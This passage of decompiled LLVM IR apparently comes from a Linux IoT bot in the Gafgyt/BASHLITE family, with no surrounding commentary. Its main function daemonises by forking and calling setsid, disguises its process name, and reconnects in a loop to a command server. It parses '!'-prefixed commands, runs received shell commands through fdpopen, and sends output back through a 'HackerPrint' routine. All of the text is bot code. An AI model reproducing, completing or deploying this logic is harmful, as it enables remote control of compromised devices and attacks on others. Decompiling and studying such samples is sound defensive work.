  %v4_130f8 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0, i32 4096)
  br label %dec_label_pc_130fc

dec_label_pc_130fc:                               ; preds = %dec_label_pc_13058, %dec_label_pc_130e0
  %v4_13114 = call i32 @fdgets(i32 %v2_13104, i32 4096, i32 %v3_1306c, i32 %v2_13104)
  %v2_1311c = icmp eq i32 %v4_13114, 0
  br i1 %v2_1311c, label %dec_label_pc_13124, label %dec_label_pc_1307c

dec_label_pc_13124:                               ; preds = %dec_label_pc_130fc, %dec_label_pc_130d0
  %v1_13128 = call i32 @__GI___libc_close(i32 %v3_1306c)
  %v4_13138 = load i8, i8* %stack_var_-4168, align 1
  %v2_1313c = icmp eq i8 %v4_13138, 0
  br i1 %v2_1313c, label %dec_label_pc_131d4, label %dec_label_pc_13144

dec_label_pc_13144:                               ; preds = %dec_label_pc_13124
  %v2_1314c = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_13104, i32* @r1, align 4
  %v2_13164 = bitcast i32* %stack_var_-4200 to i8*
  %v3_13164 = call i32 @strcpy(i8* %v2_13164, i32 %v2_13104)
  store i32 %v2_1314c, i32* @r3, align 4
  %v3_13184 = call i32 @ioctl(i32 %v3_12f7c, i32 35111, i32 %v2_1314c)
  %v2_131a4 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_13194

dec_label_pc_13194:                               ; preds = %dec_label_pc_13144, %dec_label_pc_13194
  %storemerge47 = phi i32 [ 0, %dec_label_pc_13144 ], [ %v1_131c0, %dec_label_pc_13194 ]
  store i32 %storemerge47, i32* @r1, align 4
  %v2_131ac = add i32 %storemerge47, %v2_131a4
  %v1_131b0 = inttoptr i32 %v2_131ac to i8*
  %v2_131b0 = load i8, i8* %v1_131b0, align 1
  %v4_131b8 = add i32 %storemerge47, ptrtoint (i32* @global_var_324d8.1280 to i32)
  %v5_131b8 = inttoptr i32 %v4_131b8 to i8*
  store i8 %v2_131b0, i8* %v5_131b8, align 1
  %v1_131c0 = add nuw nsw i32 %storemerge47, 1
  %v7_131d0 = icmp slt i32 %v1_131c0, 6
  br i1 %v7_131d0, label %dec_label_pc_13194, label %dec_label_pc_131d4

dec_label_pc_131d4:                               ; preds = %dec_label_pc_13194, %dec_label_pc_13124
  %v1_131d8 = call i32 @__GI___libc_close(i32 %v3_12f7c)
  %v3_131f4.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_131f0

dec_label_pc_131e0:                               ; preds = %dec_label_pc_13048, %dec_label_pc_13008, %dec_label_pc_12f94
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_131f0

dec_label_pc_131f0:                               ; preds = %dec_label_pc_131d4, %dec_label_pc_131e0
  %v3_131f4 = phi i32 [ %v3_131f4.pre, %dec_label_pc_131d4 ], [ 0, %dec_label_pc_131e0 ]
  %v2_131fc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_131fc, i32* @fp, align 4
  ret i32 %v3_131f4

; uselistorder directives
  uselistorder i32 %storemerge47, { 3, 1, 0, 2 }
  uselistorder i32 %v1_130b8, { 1, 0 }
  uselistorder i32 %v2_13104, { 2, 1, 3, 5, 0, 4 }
  uselistorder i32 %v3_12f7c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_htons, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i32 53, { 0, 2, 1 }
  uselistorder i32 (i32)* @inet_addr, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_131f0, { 1, 0 }
  uselistorder label %dec_label_pc_13194, { 1, 0 }
  uselistorder label %dec_label_pc_130fc, { 1, 0 }
  uselistorder label %dec_label_pc_130b4, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v3_13230 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_280c4.1282 to i32), i32 0)
  %v7_13238 = icmp eq i32 %v3_13230, -1
  %v4_13254 = select i1 %v7_13238, i32 ptrtoint ([7 x i8]* @global_var_280dc.1286 to i32), i32 ptrtoint ([7 x i8]* @global_var_280d4.1284 to i32)
  ret i32 %v4_13254
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13278 = load i32, i32* @r4, align 4
  store i32 %v3_13278, i32* %stack_var_-24, align 4
  store i32 78464, i32* %stack_var_-4, align 4
  %v19_13278 = ptrtoint i32* %stack_var_-24 to i32
  %v2_1327c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1327c, i32* @fp, align 4
  %v3_132b8 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_280c4.1282 to i32), i32 0)
  store i32 %v3_132b8, i32* @r0, align 4
  %v7_132c0 = icmp eq i32 %v3_132b8, -1
  %. = select i1 %v7_132c0, i32 ptrtoint ([19 x i8]* @global_var_280f0.1293 to i32), i32 ptrtoint ([5 x i8]* @global_var_280e8.1291 to i32)
  %v0_132dc = call i32 @geteuid()
  %v2_132e4 = icmp eq i32 %v0_132dc, 0
  br i1 %v2_132e4, label %dec_label_pc_132ec, label %dec_label_pc_132f8

dec_label_pc_132ec:                               ; preds = %entry
  store i32 0, i32* @global_var_32214.1295, align 4
  br label %dec_label_pc_132f8

dec_label_pc_132f8:                               ; preds = %entry, %dec_label_pc_132ec
  %v0_132f8 = call i32 @getBuild()
  %v0_13304 = call i32 @getBuild()
  store i32 %v0_13304, i32* @r4, align 4
  %v2_13310 = load i32, i32* @global_var_391e8.487, align 4
  store i32 %v2_13310, i32* @r0, align 4
  %v1_13314 = call i32 @__GI_inet_ntoa(i32 %v2_13310)
  %v0_13320 = load i32, i32* @r4, align 4
  %v1_13320 = inttoptr i32 %v0_13320 to i8*
  %v1_13324 = inttoptr i32 %v1_13314 to i8*
  %v9_13328 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_28104.1298, i32 0, i32 0), i8* %v1_13320, i8* %v1_13324)
  %v1_1333c = bitcast i8** %argv to i32*
  %v2_1333c = load i32, i32* %v1_1333c, align 4
  store i32 %v2_1333c, i32* @r4, align 4
  %v2_13354 = load i32, i32* %v1_1333c, align 4
  %v1_13358 = inttoptr i32 %v2_13354 to i8*
  %v3_1335c = call i32 @strlen(i8* %v1_13358)
  %v0_13364 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_280e4.1288 to i32), i32* @r1, align 4
  %v3_13370 = call i32 @strncpy(i32 %v0_13364, i32 ptrtoint (i32* @global_var_280e4.1288 to i32), i32 %v3_1335c)
  %v2_13384 = load i32, i32* %v1_1333c, align 4
  store i32 %v2_13384, i32* @r0, align 4
  %v2_13390 = call i32 @sprintf(i32 %v2_13384, i32 %.)
  %v6_133b4 = call i32 @prctl(i32 15, i32 %., i32 0, i32 0, i32 0)
  %v2_133bc = call i32 @__GI_time(i32* null)
  store i32 %v2_133bc, i32* @r4, align 4
  %v0_133c4 = call i32 @__getpid()
  %v0_133cc = load i32, i32* @r4, align 4
  %v2_133cc = xor i32 %v0_133cc, %v0_133c4
  %v1_133d4 = call i32 @srand(i32 %v2_133cc)
  %v2_133dc = call i32 @__GI_time(i32* null)
  store i32 %v2_133dc, i32* @r4, align 4
  %v0_133e4 = call i32 @__getpid()
  %v0_133ec = load i32, i32* @r4, align 4
  %v2_133ec = xor i32 %v0_133ec, %v0_133e4
  %v1_133f4 = call i32 @init_rand(i32 %v2_133ec)
  %v1_133f8 = call i32 @getOurIP(i32 %v1_133f4)
  %v0_133fc = call i32 @__libc_fork()
  %v2_1340c = icmp eq i32 %v0_133fc, 0
  br i1 %v2_1340c, label %dec_label_pc_1343c, label %dec_label_pc_13430

dec_label_pc_13430:                               ; preds = %dec_label_pc_132f8
  %v2_13414 = ptrtoint i32* %stack_var_-92 to i32
  %v3_13424 = call i32 @__libc_waitpid(i32 %v0_133fc, i32 %v2_13414, i32 0)
  %v1_1342c = call i32 @__GI_exit(i32 0)
  store i32 %v1_1342c, i32* @r0, align 4
  br label %dec_label_pc_1345c

dec_label_pc_1343c:                               ; preds = %dec_label_pc_132f8
  %v0_1343c = call i32 @__libc_fork()
  store i32 %v0_1343c, i32* @r0, align 4
  %v2_1344c = icmp eq i32 %v0_1343c, 0
  br i1 %v2_1344c, label %dec_label_pc_1345c, label %dec_label_pc_13454

dec_label_pc_13454:                               ; preds = %dec_label_pc_1343c
  %v1_13458 = call i32 @__GI_exit(i32 0)
  store i32 %v1_13458, i32* @r0, align 4
  br label %dec_label_pc_1345c

dec_label_pc_1345c:                               ; preds = %dec_label_pc_13430, %dec_label_pc_1343c, %dec_label_pc_13454
  %v0_1345c = call i32 @__GI_setsid()
  %v1_13464 = call i32 @chdir(i32 ptrtoint (i32* @global_var_28114.1300 to i32))
  %v2_13470 = call i32 @bsd_signal(i32 13, i32 1)
  %v2_13cb0 = ptrtoint i32* %stack_var_-5252 to i32
  %v4_13cc0 = bitcast i32* %stack_var_-5252 to i8*
  %v1_138ec = or i32 %v2_13cb0, 1
  %v5_138f0 = inttoptr i32 %v1_138ec to i8*
  %v2_13a50 = ptrtoint i32* %stack_var_-1156 to i32
  %v3_13a60 = bitcast i32* %stack_var_-1156 to i8*
  %v2_13c3c = bitcast i8** %stack_var_-132 to i32*
  %v2_13c70 = add i32 %v19_13278, -108
  br label %dec_label_pc_13474

dec_label_pc_13474:                               ; preds = %dec_label_pc_13484, %dec_label_pc_13ca0, %dec_label_pc_1345c
  %v0_13474 = call i32 @initConnection()
  %v2_1347c = icmp eq i32 %v0_13474, 0
  br i1 %v2_1347c, label %dec_label_pc_13490, label %dec_label_pc_13484

dec_label_pc_13484:                               ; preds = %dec_label_pc_13474
  %v1_13488 = call i32 @sleep(i32 5)
  br label %dec_label_pc_13474

dec_label_pc_13490:                               ; preds = %dec_label_pc_13474
  %v2_13494 = load i32, i32* @global_var_324c8.59, align 4
  store i32 %v2_13494, i32* @r4, align 4
  %v2_1349c = load i32, i32* @global_var_391e8.487, align 4
  store i32 %v2_1349c, i32* @r0, align 4
  %v1_134a0 = call i32 @__GI_inet_ntoa(i32 %v2_1349c)
  store i32 %v1_134a0, i32* @r5, align 4
  %v0_134a8 = call i32 @getBuild()
  %v0_134b8 = load i32, i32* @r4, align 4
  %v0_134c0 = load i32, i32* @r5, align 4
  store i32 %v0_134c0, i32* @r2, align 4
  %v2_134c8 = call i32 @HackerPrint(i32 %v0_134b8, i32 ptrtoint (i32* @global_var_28118.1305 to i32))
  br label %dec_label_pc_13ca0

dec_label_pc_134ec:                               ; preds = %dec_label_pc_137a4, %dec_label_pc_13748
  %v3_134f0 = mul i32 %storemerge16, 4
  %v2_134fc = load i32, i32* @global_var_391f4.68, align 4
  %v2_13500 = add i32 %v2_134fc, %v3_134f0
  %v1_13504 = inttoptr i32 %v2_13500 to i32*
  %v2_13504 = load i32, i32* %v1_13504, align 4
  %v3_13514 = call i32 @__libc_waitpid(i32 %v2_13504, i32 0, i32 1)
  %tmp103 = icmp slt i32 %v3_13514, 1
  br i1 %tmp103, label %dec_label_pc_1373c, label %dec_label_pc_13578

dec_label_pc_13534:                               ; preds = %dec_label_pc_13578, %dec_label_pc_135d0
  %v2_13538 = load i32, i32* @global_var_391f4.68, align 4
  %v3_13544 = mul i32 %v1_13528, 4
  %v1_1353c = add i32 %v3_13544, -4
  %v2_13548 = add i32 %v1_1353c, %v2_13538
  %v2_13560 = add i32 %v2_13538, %v3_13544
  %v1_13564 = inttoptr i32 %v2_13560 to i32*
  %v2_13564 = load i32, i32* %v1_13564, align 4
  %v2_13568 = inttoptr i32 %v2_13548 to i32*
  store i32 %v2_13564, i32* %v2_13568, align 4
  br label %dec_label_pc_13578

dec_label_pc_13578:                               ; preds = %dec_label_pc_134ec, %dec_label_pc_13534
  %v3_13524.sink = phi i32 [ %v1_13528, %dec_label_pc_13534 ], [ %storemerge16, %dec_label_pc_134ec ]
  %v1_13528 = add i32 %v3_13524.sink, 1
  %v2_13590 = load i32, i32* @global_var_324d0.65, align 4
  %v9_135b0 = icmp eq i32 %v2_13590, 0
  br i1 %v9_135b0, label %dec_label_pc_135d0, label %dec_label_pc_13534

dec_label_pc_135d0:                               ; preds = %dec_label_pc_13578
  %v5_13590 = load i32, i32* @global_var_324d4.66, align 4
  %tmp104 = icmp ugt i32 %v5_13590, %v1_13528
  br i1 %tmp104, label %dec_label_pc_13534, label %dec_label_pc_135e8

dec_label_pc_135e8:                               ; preds = %dec_label_pc_135d0
  %v2_135ec = load i32, i32* @global_var_391f4.68, align 4
  %v3_135f8 = mul i32 %v1_13528, 4
  %v1_135f0 = add i32 %v3_135f8, -4
  %v2_135fc = add i32 %v1_135f0, %v2_135ec
  %v2_13604 = inttoptr i32 %v2_135fc to i32*
  store i32 0, i32* %v2_13604, align 4
  %v2_1360c = load i32, i32* @global_var_324d0.65, align 4
  %v5_1360c = load i32, i32* @global_var_324d4.66, align 4
  %v2_13618 = add i32 %v2_1360c, -1
  %v3_13618 = icmp ne i32 %v2_1360c, 0
  %v3_1361c = add i32 %v5_1360c, -1
  %v4_1361c = zext i1 %v3_13618 to i32
  %v5_1361c = add i32 %v3_1361c, %v4_1361c
  store i32 %v2_13618, i32* @global_var_324d0.65, align 4
  store i32 %v5_1361c, i32* @global_var_324d4.66, align 4
  %v3_13638 = icmp eq i32 %v2_1360c, 0
  %v4_1363c = zext i1 %v3_13638 to i32
  %v5_1363c = add i32 %v5_1361c, %v4_1363c
  %v3_13640 = udiv i32 %v2_1360c, 1073741824
  %v3_13644 = mul i32 %v5_1363c, 4
  %v2_13648 = or i32 %v3_13644, %v3_13640
  store i32 %v2_13648, i32* @r4, align 4
  %v3_1364c = mul i32 %v2_1360c, 4
  %v1_13654 = call i32 @malloc(i32 %v3_1364c)
  br label %dec_label_pc_136ac

dec_label_pc_1366c:                               ; preds = %dec_label_pc_136ac, %dec_label_pc_13708
  %v3_13670 = mul i32 %storemerge20, 4
  %v2_1367c = add i32 %v3_13670, %v1_13654
  %v2_13690 = load i32, i32* @global_var_391f4.68, align 4
  %v2_13694 = add i32 %v2_13690, %v3_13670
  %v1_13698 = inttoptr i32 %v2_13694 to i32*
  %v2_13698 = load i32, i32* %v1_13698, align 4
  %v2_1369c = inttoptr i32 %v2_1367c to i32*
  store i32 %v2_13698, i32* %v2_1369c, align 4
  %v1_136a4 = add i32 %storemerge20, 1
  br label %dec_label_pc_136ac

dec_label_pc_136ac:                               ; preds = %dec_label_pc_135e8, %dec_label_pc_1366c
  %storemerge20 = phi i32 [ 0, %dec_label_pc_135e8 ], [ %v1_136a4, %dec_label_pc_1366c ]
  %v2_136c8 = load i32, i32* @global_var_324d0.65, align 4
  %v9_136e8 = icmp eq i32 %v2_136c8, 0
  br i1 %v9_136e8, label %dec_label_pc_13708, label %dec_label_pc_1366c

dec_label_pc_13708:                               ; preds = %dec_label_pc_136ac
  %v5_136c8 = load i32, i32* @global_var_324d4.66, align 4
  %tmp = icmp ugt i32 %v5_136c8, %storemerge20
  br i1 %tmp, label %dec_label_pc_1366c, label %dec_label_pc_13720

dec_label_pc_13720:                               ; preds = %dec_label_pc_13708
  %v2_13724 = load i32, i32* @global_var_391f4.68, align 4
  store i32 %v2_13724, i32* @r0, align 4
  %v0_1372c = call i32 @free()
  store i32 %v1_13654, i32* @global_var_391f4.68, align 4
  br label %dec_label_pc_1373c

dec_label_pc_1373c:                               ; preds = %dec_label_pc_134ec, %dec_label_pc_13720
  %v1_13740 = add i32 %storemerge16, 1
  br label %dec_label_pc_13748

dec_label_pc_13748:                               ; preds = %dec_label_pc_13ca0, %dec_label_pc_1373c
  %storemerge16 = phi i32 [ %v1_13740, %dec_label_pc_1373c ], [ 0, %dec_label_pc_13ca0 ]
  %v3_13750 = ashr i32 %storemerge16, 31
  %v2_13764 = load i32, i32* @global_var_324d0.65, align 4
  %v5_13764 = load i32, i32* @global_var_324d4.66, align 4
  %v3_13784 = icmp uge i32 %v2_13764, %v3_13750
  %v9_13784 = icmp eq i32 %v2_13764, %v3_13750
  %v2_13788 = xor i1 %v9_13784, true
  %v3_13788 = and i1 %v3_13784, %v2_13788
  br i1 %v3_13788, label %dec_label_pc_134ec, label %dec_label_pc_1378c

dec_label_pc_1378c:                               ; preds = %dec_label_pc_13748
  br i1 %v9_13784, label %dec_label_pc_137a4, label %dec_label_pc_137bc

dec_label_pc_137a4:                               ; preds = %dec_label_pc_1378c
  %tmp118 = icmp ugt i32 %v5_13764, %storemerge16
  br i1 %tmp118, label %dec_label_pc_134ec, label %dec_label_pc_137bc

dec_label_pc_137bc:                               ; preds = %dec_label_pc_1378c, %dec_label_pc_137a4
  %v2_137d0 = add i32 %v5_13cc0, %v2_13cb0
  %v3_137d8 = inttoptr i32 %v2_137d0 to i8*
  store i8 0, i8* %v3_137d8, align 1
  %v2_137ec = call i32 @trim(i8* %v4_13cc0)
  %v4_13804 = call i32 @strstr(i32 %v2_13cb0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_23a88.61, i32 0, i32 0))
  store i32 %v4_13804, i32* @r2, align 4
  %v9_13818 = icmp eq i32 %v4_13804, %v2_13cb0
  br i1 %v9_13818, label %dec_label_pc_13820, label %dec_label_pc_13838

dec_label_pc_13820:                               ; preds = %dec_label_pc_137bc
  %v2_13824 = load i32, i32* @global_var_324c8.59, align 4
  %v3_13830 = call i32 @HackerPrint(i32 %v2_13824, i32 ptrtoint ([5 x i8]* @global_var_281a0.1310 to i32))
  br label %dec_label_pc_13ca0

dec_label_pc_13838:                               ; preds = %dec_label_pc_137bc
  %v6_1384c = call i32 @strstr(i32 %v2_13cb0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_281a8.1312, i32 0, i32 0))
  %v9_13860 = icmp eq i32 %v6_1384c, %v2_13cb0
  br i1 %v9_13860, label %dec_label_pc_13868, label %dec_label_pc_13870

dec_label_pc_13868:                               ; preds = %dec_label_pc_13838
  %v1_1386c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_13870

dec_label_pc_13870:                               ; preds = %dec_label_pc_13838, %dec_label_pc_13868
  %v2_13884 = load i8, i8* %v4_13cc0, align 4
  %v7_13888 = icmp eq i8 %v2_13884, 33
  br i1 %v7_13888, label %dec_label_pc_138ac, label %dec_label_pc_13ca0

dec_label_pc_138ac:                               ; preds = %dec_label_pc_13870, %dec_label_pc_138bc
  %v3_13890.sink = phi i8* [ %storemerge10, %dec_label_pc_138bc ], [ %v4_13cc0, %dec_label_pc_13870 ]
  %v4_13890 = ptrtoint i8* %v3_13890.sink to i32
  %v1_13894 = add i32 %v4_13890, 1
  %storemerge10 = inttoptr i32 %v1_13894 to i8*
  %v2_138b0 = load i8, i8* %storemerge10, align 1
  %v7_138b4 = icmp eq i8 %v2_138b0, 32
  br i1 %v7_138b4, label %dec_label_pc_138cc, label %dec_label_pc_138bc

dec_label_pc_138bc:                               ; preds = %dec_label_pc_138ac
  %v2_138c0 = load i8, i8* %storemerge10, align 1
  %v2_138c4 = icmp eq i8 %v2_138c0, 0
  br i1 %v2_138c4, label %dec_label_pc_138cc, label %dec_label_pc_138ac

dec_label_pc_138cc:                               ; preds = %dec_label_pc_138bc, %dec_label_pc_138ac
  %v2_138d0 = load i8, i8* %storemerge10, align 1
  %v2_138d4 = icmp eq i8 %v2_138d0, 0
  br i1 %v2_138d4, label %dec_label_pc_13ca0, label %dec_label_pc_138dc

dec_label_pc_138dc:                               ; preds = %dec_label_pc_138cc
  store i8 0, i8* %storemerge10, align 1
  %v3_138fc = call i32 @strlen(i8* %v5_138f0)
  %v2_1390c = add i32 %v3_138fc, %v2_13cb0
  %v1_13910 = add i32 %v2_1390c, 2
  %v5_13914 = inttoptr i32 %v1_13910 to i8*
  %v1_13944 = add i32 %v2_1390c, 1
  br label %dec_label_pc_13940

dec_label_pc_1391c:                               ; preds = %dec_label_pc_13968, %dec_label_pc_13940
  %v3_1392c = call i32 @strlen(i8* %v5_13914)
  %v2_13934 = add i32 %v1_13944, %v3_1392c
  %v3_1393c = inttoptr i32 %v2_13934 to i8*
  store i8 0, i8* %v3_1393c, align 1
  br label %dec_label_pc_13940

dec_label_pc_13940:                               ; preds = %dec_label_pc_138dc, %dec_label_pc_1391c
  %v3_13950 = call i32 @strlen(i8* %v5_13914)
  %v2_13958 = add i32 %v1_13944, %v3_13950
  %v1_1395c = inttoptr i32 %v2_13958 to i8*
  %v2_1395c = load i8, i8* %v1_1395c, align 1
  %v7_13960 = icmp eq i8 %v2_1395c, 10
  br i1 %v7_13960, label %dec_label_pc_1391c, label %dec_label_pc_13968

dec_label_pc_13968:                               ; preds = %dec_label_pc_13940
  store i32 %v1_13944, i32* @r4, align 4
  %v3_13978 = call i32 @strlen(i8* %v5_13914)
  %v0_13980 = load i32, i32* @r4, align 4
  %v2_13980 = add i32 %v0_13980, %v3_13978
  %v1_13984 = inttoptr i32 %v2_13980 to i8*
  %v2_13984 = load i8, i8* %v1_13984, align 1
  %v7_13988 = icmp eq i8 %v2_13984, 13
  br i1 %v7_13988, label %dec_label_pc_1391c, label %dec_label_pc_13990

dec_label_pc_13990:                               ; preds = %dec_label_pc_13968
  %v2_139ac22 = load i8, i8* %v5_13914, align 1
  %v7_139b026 = icmp eq i8 %v2_139ac22, 32
  br i1 %v7_139b026, label %dec_label_pc_139c8, label %dec_label_pc_139b8

dec_label_pc_1399c:                               ; preds = %dec_label_pc_139b8
  %v1_139a0 = add i32 %v4_139a828, 1
  %v5_139a4 = inttoptr i32 %v1_139a0 to i8*
  %v2_139ac = load i8, i8* %v5_139a4, align 1
  %v7_139b0 = icmp eq i8 %v2_139ac, 32
  br i1 %v7_139b0, label %dec_label_pc_139c8, label %dec_label_pc_139b8

dec_label_pc_139b8:                               ; preds = %dec_label_pc_13990, %dec_label_pc_1399c
  %v4_139a828 = phi i32 [ %v1_139a0, %dec_label_pc_1399c ], [ %v1_13910, %dec_label_pc_13990 ]
  %stack_var_-64.027 = phi i8* [ %v5_139a4, %dec_label_pc_1399c ], [ %v5_13914, %dec_label_pc_13990 ]
  %v2_139bc = load i8, i8* %stack_var_-64.027, align 1
  %v2_139c0 = icmp eq i8 %v2_139bc, 0
  br i1 %v2_139c0, label %dec_label_pc_139c8, label %dec_label_pc_1399c

dec_label_pc_139c8:                               ; preds = %dec_label_pc_1399c, %dec_label_pc_139b8, %dec_label_pc_13990
  %stack_var_-64.0.lcssa = phi i8* [ %v5_13914, %dec_label_pc_13990 ], [ %v5_139a4, %dec_label_pc_1399c ], [ %stack_var_-64.027, %dec_label_pc_139b8 ]
  %v4_139a8.lcssa = phi i32 [ %v1_13910, %dec_label_pc_13990 ], [ %v1_139a0, %dec_label_pc_1399c ], [ %v4_139a828, %dec_label_pc_139b8 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_139d8 = add i32 %v4_139a8.lcssa, 1
  %v2_13a1c33 = load i8, i8* %v5_13914, align 1
  %v2_13a2035 = icmp eq i8 %v2_13a1c33, 0
  br i1 %v2_13a2035, label %dec_label_pc_13a28, label %dec_label_pc_139ec

dec_label_pc_139ec:                               ; preds = %dec_label_pc_139c8, %dec_label_pc_139ec
  %v4_13a1837 = phi i32 [ %v1_13a10, %dec_label_pc_139ec ], [ %v1_13910, %dec_label_pc_139c8 ]
  %storemerge936 = phi i8* [ %v5_13a14, %dec_label_pc_139ec ], [ %v5_13914, %dec_label_pc_139c8 ]
  %v2_139f0 = load i8, i8* %storemerge936, align 1
  %v3_139f0 = zext i8 %v2_139f0 to i32
  %v1_139f8 = call i32 @__GI_toupper(i32 %v3_139f0)
  %v1_13a08 = trunc i32 %v1_139f8 to i8
  store i8 %v1_13a08, i8* %storemerge936, align 1
  %v1_13a10 = add i32 %v4_13a1837, 1
  %v5_13a14 = inttoptr i32 %v1_13a10 to i8*
  %v2_13a1c = load i8, i8* %v5_13a14, align 1
  %v2_13a20 = icmp eq i8 %v2_13a1c, 0
  br i1 %v2_13a20, label %dec_label_pc_13a28, label %dec_label_pc_139ec

dec_label_pc_13a28:                               ; preds = %dec_label_pc_139ec, %dec_label_pc_139c8
  %v2_13a2c = load i8, i8* %v5_13914, align 1
  %v2_13a30 = icmp eq i8 %v2_13a2c, 0
  br i1 %v2_13a30, label %dec_label_pc_13a38, label %dec_label_pc_13b1c

dec_label_pc_13a38:                               ; preds = %dec_label_pc_13a28
  %v0_13a38 = call i32 @listFork()
  %v2_13a40 = icmp eq i32 %v0_13a38, 0
  br i1 %v2_13a40, label %dec_label_pc_13a48, label %dec_label_pc_13ca0

dec_label_pc_13a48:                               ; preds = %dec_label_pc_13a38
  %v4_13a60 = call i32 @__GI_memset(i8* %v3_13a60, i32 0, i32 1024)
  %v6_13a80 = call i32 @szprintf(i32 %v2_13a50, i32 ptrtoint ([8 x i8]* @global_var_281ac.1314 to i32), i32 %v1_139d8, i32 %v2_13a50, i32 ptrtoint (i32* @0 to i32))
  %v3_13a9c = call i32 @fdpopen(i32 %v2_13a50, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_281b4.1316, i32 0, i32 0))
  br label %dec_label_pc_13ae4

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13ae4
  %v2_13abc = call i32 @trim(i8* %v3_13a60)
  %v4_13ad8 = call i32 @__GI_memset(i8* %v3_13a60, i32 0, i32 1024)
  %v1_13ae0 = call i32 @sleep(i32 1)
  br label %dec_label_pc_13ae4

dec_label_pc_13ae4:                               ; preds = %dec_label_pc_13a48, %dec_label_pc_13aac
  %v4_13afc = call i32 @fdgets(i32 %v2_13a50, i32 1024, i32 %v3_13a9c, i32 %v2_13a50)
  %v2_13b04 = icmp eq i32 %v4_13afc, 0
  br i1 %v2_13b04, label %dec_label_pc_13b0c, label %dec_label_pc_13aac

dec_label_pc_13b0c:                               ; preds = %dec_label_pc_13ae4
  %v1_13b10 = call i32 @fdpclose(i32 %v3_13a9c)
  %v1_13b18 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_13b1c

dec_label_pc_13b1c:                               ; preds = %dec_label_pc_13a28, %dec_label_pc_13b0c
  %v2_13b30 = call i32 @__GI_strtok(i32 %v1_139d8, i32 ptrtoint (i32* @global_var_281b8.1318 to i32))
  store i8* %v5_13914, i8** %stack_var_-132, align 4
  %v2_13c2840 = icmp eq i32 %v2_13b30, 0
  br i1 %v2_13c2840, label %dec_label_pc_13c30, label %dec_label_pc_13b48

dec_label_pc_13b48:                               ; preds = %dec_label_pc_13b1c, %dec_label_pc_13c10
  %stack_var_-36.043.in = phi i32 [ %v2_13c18, %dec_label_pc_13c10 ], [ %v2_13b30, %dec_label_pc_13b1c ]
  %stack_var_-40.141 = phi i32 [ %stack_var_-40.0, %dec_label_pc_13c10 ], [ 1, %dec_label_pc_13b1c ]
  %stack_var_-36.043 = inttoptr i32 %stack_var_-36.043.in to i8*
  %v2_13b4c = load i8, i8* %stack_var_-36.043, align 1
  %v7_13b50 = icmp eq i8 %v2_13b4c, 10
  br i1 %v7_13b50, label %dec_label_pc_13c10, label %dec_label_pc_13b58

dec_label_pc_13b58:                               ; preds = %dec_label_pc_13b48
  store i32 %stack_var_-40.141, i32* @r4, align 4
  %v3_13b64 = call i32 @strlen(i8* nonnull %stack_var_-36.043)
  %v1_13b6c = add i32 %v3_13b64, 1
  %v1_13b74 = call i32 @malloc(i32 %v1_13b6c)
  %v0_13b84 = load i32, i32* @r4, align 4
  %v3_13b84 = mul i32 %v0_13b84, 4
  %v2_13b90 = add i32 %v2_13c70, %v3_13b84
  %v2_13b94 = inttoptr i32 %v2_13b90 to i32*
  store i32 %v1_13b74, i32* %v2_13b94, align 4
  %v3_13ba0 = mul i32 %stack_var_-40.141, 4
  %v2_13bac = add i32 %v2_13c70, %v3_13ba0
  %v1_13bb0 = inttoptr i32 %v2_13bac to i32*
  %v2_13bb0 = load i32, i32* %v1_13bb0, align 4
  store i32 %v2_13bb0, i32* @r4, align 4
  %v3_13bbc = call i32 @strlen(i8* nonnull %stack_var_-36.043)
  %v1_13bc4 = add i32 %v3_13bbc, 1
  %v0_13bc8 = load i32, i32* @r4, align 4
  %v3_13bd4 = inttoptr i32 %v0_13bc8 to i8*
  %v4_13bd4 = call i32 @__GI_memset(i8* %v3_13bd4, i32 0, i32 %v1_13bc4)
  %v2_13bf0 = load i32, i32* %v1_13bb0, align 4
  store i32 %stack_var_-36.043.in, i32* @r1, align 4
  %v3_13c00 = inttoptr i32 %v2_13bf0 to i8*
  %v4_13c00 = call i32 @strcpy(i8* %v3_13c00, i32 %stack_var_-36.043.in)
  %v1_13c08 = add i32 %stack_var_-40.141, 1
  br label %dec_label_pc_13c10

dec_label_pc_13c10:                               ; preds = %dec_label_pc_13b48, %dec_label_pc_13b58
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.141, %dec_label_pc_13b48 ], [ %v1_13c08, %dec_label_pc_13b58 ]
  %v2_13c18 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_281b8.1318 to i32))
  %v2_13c28 = icmp eq i32 %v2_13c18, 0
  br i1 %v2_13c28, label %dec_label_pc_13c30, label %dec_label_pc_13b48

